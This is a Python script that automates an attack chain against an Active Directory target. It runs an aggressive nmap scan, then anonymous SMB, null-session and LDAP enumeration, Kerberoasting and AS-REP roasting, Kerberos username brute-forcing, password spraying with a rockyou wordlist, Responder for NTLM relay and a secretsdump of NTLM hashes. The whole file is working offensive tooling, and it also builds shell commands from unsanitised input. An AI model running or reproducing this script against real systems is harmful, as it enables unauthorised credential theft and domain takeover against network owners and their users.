import subprocess
from ldap3 import Server, Connection, ALL
import os

# Nmap Scan Function
def run_nmap(ip):
    nmap_command = ["nmap", "-sV", "-A", "-T5", ip]
    result = subprocess.run(nmap_command, capture_output=True, text=True)
    return result.stdout

# Function to extract domain from Nmap output
def find_domain(nmap_result):
    print("[*] Attempting to find the domain from the Nmap scan results...")
    try:
        for line in nmap_result.splitlines():
            if "Domain name:" in line or "Domain:" in line:
                domain = line.split(":")[1].strip()
                print(f"[+] Domain found: {domain}")
                return domain
        print("[-] Domain not found in Nmap results.")
        return None
    except Exception as e:
        print(f"[-] Could not extract domain: {e}")
        return None

# DNS SRV Queries to Identify Domain Controllers
def find_domain_controllers(domain):
    print("[*] Querying DNS SRV records to find Domain Controllers...")
    try:
        dns_query = f"nslookup -type=srv _ldap._tcp.dc._msdcs.{domain}"
        dns_result = subprocess.run(dns_query, shell=True, capture_output=True, text=True)
        print(f"[+] Domain Controllers found:\n{dns_result.stdout}")
        return dns_result.stdout
    except Exception as e:
        print(f"[-] Error finding Domain Controllers: {e}")
        return None

# SMB Enumeration (Anonymous SMB Check)
def smb_enum(ip):
    smb_command = f"smbclient -L \\\\{ip} -N"
    print(f"Running SMB enumeration (anonymous check): {smb_command}")
    subprocess.run(smb_command, shell=True)

# LDAP Enumeration and Object Class Queries
def ldap_enum(ip, domain):
    try:
        server = Server(ip, get_info=ALL)
        conn = Connection(server, user='', password='', auto_bind=False)  # Anonymous connection attempt

        if conn.bind():
            print("[+] Anonymous bind to LDAP successful.")
            conn.search(search_base=f'dc={domain.replace(".",",dc=")}', search_filter='(objectClass=person)', attributes=['cn', 'mail'])
            users = []
            for entry in conn.entries:
                print(entry)
                users.append(str(entry.cn))

            # Save users to a file
            with open("users.txt", "w") as user_file:
                for user in users:
                    user_file.write(f"{user}\n")

            print("[+] Users saved to users.txt.")
        else:
            print("[-] Anonymous bind failed, trying authentication...")

        conn.unbind()
    except Exception as e:
        print(f"[-] LDAP Enumeration failed: {e}")

# Kerberoasting using Impacket's GetUserSPNs
def kerberoasting(ip, domain, username, password):
    kerb_command = f"/usr/share/doc/python3-impacket/examples/GetUserSPNs.py {domain}/{username}:{password}@{ip} -request"
    print(f"Running Kerberoasting: {kerb_command}")
    subprocess.run(kerb_command, shell=True)

# AS-REP Roasting using Impacket's GetNPUsers
def asrep_roasting(ip, domain):
    asrep_command = f"/usr/share/doc/python3-impacket/examples/GetNPUsers.py {domain}/ -no-pass -usersfile users.txt -format hashcat -dc-ip {ip}"
    print(f"Running AS-REP Roasting: {asrep_command}")
    subprocess.run(asrep_command, shell=True)

# Password Spraying with CrackMapExec
def password_spray(ip, domain):
    spray_command = f"crackmapexec smb {ip} -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success"
    print(f"Running Password Spraying: {spray_command}")
    subprocess.run(spray_command, shell=True)

# NTLM Relay Attack using Responder
def ntlm_relay():
    responder_command = "responder -I eth0"
    print(f"Starting Responder for NTLM Relay attacks: {responder_command}")
    subprocess.run(responder_command, shell=True)

# Extract NTLM Hashes with SecretsDump
def dump_ntlm_hashes(ip, domain, username, password):
    dump_command = f"/usr/share/doc/python3-impacket/examples/secretsdump.py {domain}/{username}:{password}@{ip}"
    print(f"Dumping NTLM hashes: {dump_command}")
    subprocess.run(dump_command, shell=True)

# Bruteforce Username Discovery via Kerberos
def kerberos_user_enum(ip, domain):
    kerbrute_command = f"kerbrute userenum --dc {ip} --users /usr/share/wordlists/usernames.txt {domain}"
    print(f"Running Kerberos User Enumeration: {kerbrute_command}")
    subprocess.run(kerbrute_command, shell=True)

# SMB Null Session Enumeration
def smb_null_sessions(ip):
    rpc_command = f"rpcclient -U \"\" {ip} --command=srvinfo"
    print(f"Enumerating SMB null sessions: {rpc_command}")
    subprocess.run(rpc_command, shell=True)

# Main function that runs the enumeration and exploitation steps based on Nmap results
def main():
    target_ip = input("Enter the target IP: ")

    # Run Nmap scan
    print("Starting Nmap scan...")
    nmap_result = run_nmap(target_ip)
    print(nmap_result)

    # Attempt to find the domain automatically
    domain = find_domain(nmap_result)
    if not domain:
        domain = input("Enter the domain manually (e.g., example.com): ")

    # Identify Domain Controllers via DNS SRV queries
    find_domain_controllers(domain)

    # Smart Enumeration and Exploitation Based on Detected Services
    if "445/tcp" in nmap_result:
        print("[+] SMB Detected, running enumeration...")
        smb_enum(target_ip)
        smb_null_sessions(target_ip)

    if "389/tcp" in nmap_result or "636/tcp" in nmap_result:
        print("[+] LDAP Detected, running enumeration...")
        ldap_enum(target_ip, domain)

    if "88/tcp" in nmap_result:
        print("[+] Kerberos Detected, attempting Kerberoasting...")
        username = input("Enter username for Kerberoasting: ")
        password = input("Enter password for Kerberoasting: ")
        kerberoasting(target_ip, domain, username, password)

        print("[+] Attempting AS-REP Roasting...")
        asrep_roasting(target_ip, domain)

        print("[+] Brute-forcing usernames via Kerberos...")
        kerberos_user_enum(target_ip, domain)

    print("[+] Attempting password spraying...")
    password_spray(target_ip, domain)

    print("[+] Attempting NTLM Relay attacks using Responder...")
    ntlm_relay()

    print("[+] Attempting to dump NTLM hashes from the target...")
    username = input("Enter the username for dumping NTLM hashes: ")
    password = input("Enter the password: ")
    dump_ntlm_hashes(target_ip, domain, username, password)

    print("Enumeration and exploitation complete.")

if __name__ == "__main__":
    main()
